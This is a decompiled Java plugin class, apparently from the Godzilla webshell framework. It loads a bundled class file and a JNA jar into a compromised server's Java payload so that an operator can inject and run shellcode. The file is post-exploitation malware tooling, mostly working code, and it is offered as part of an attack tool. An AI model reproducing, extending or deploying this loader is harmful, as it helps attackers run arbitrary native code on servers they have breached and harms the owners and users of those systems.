/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.ui.ShellManage;
import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import shells.plugins.java.JarLoader;
import util.Log;
import util.functions;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="ShellcodeLoader", DisplayName="ShellcodeLoader")
public class ShellcodeLoader
extends shells.plugins.generic.ShellcodeLoader {
    private static final String CLASS_NAME = "plugin.ShellcodeLoader";
    private JarLoader jarLoader;

    private boolean loadJar(byte[] jar) {
        if (this.jarLoader == null) {
            try {
                if (this.jarLoader == null) {
                    ShellManage shellManage = this.shellEntity.getFrame();
                    this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
                }
            } catch (Exception e) {
                GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no find plugin JarLoader!");
                return false;
            }
        }
        return this.jarLoader.loadJar(jar);
    }

    @Override
    public boolean load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ShellcodeLoader.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                inputStream = this.getClass().getResourceAsStream("assets/GodzillaJna.jar");
                byte[] jar = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.loadJar(jar)) {
                    Log.log(String.format("LoadJar : %s", true), new Object[0]);
                    this.loadState = this.payload.include(CLASS_NAME, data);
                }
            } catch (Exception e) {
                Log.error(e);
                GOptionPane.showMessageDialog(this.panel, e.getMessage(), "\u63d0\u793a", 2);
            }
        }
        return this.loadState;
    }

    @Override
    public String getClassName() {
        return CLASS_NAME;
    }
}

